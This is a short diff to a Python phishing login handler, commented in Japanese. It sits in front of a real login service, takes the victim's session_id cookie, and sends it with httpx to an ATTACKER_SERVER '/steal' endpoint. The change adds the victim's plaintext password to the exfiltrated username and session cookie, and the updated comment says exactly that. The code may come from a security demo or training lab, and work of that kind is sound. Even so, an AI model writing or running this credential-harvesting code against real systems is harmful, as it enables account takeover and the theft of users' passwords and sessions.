@@ -41,11 +41,16 @@ def phishing_login(data: LoginData):
 
     session_id = real_res.cookies.get("session_id")
 
-    # 2. 窃取したsession_idを攻撃者サーバーへ送信
+    # 2. 窃取したsession_id・ユーザー名・平文パスワードを攻撃者サーバーへ送信
     try:
         httpx.get(
             f"{ATTACKER_SERVER}/steal",
-            params={"c": f"session_id={session_id}", "via": "phishing", "user": data.username},
+            params={
+                "c": f"session_id={session_id}",
+                "via": "phishing",
+                "user": data.username,
+                "password": data.password,
+            },
             timeout=3,
         )
     except httpx.RequestError:
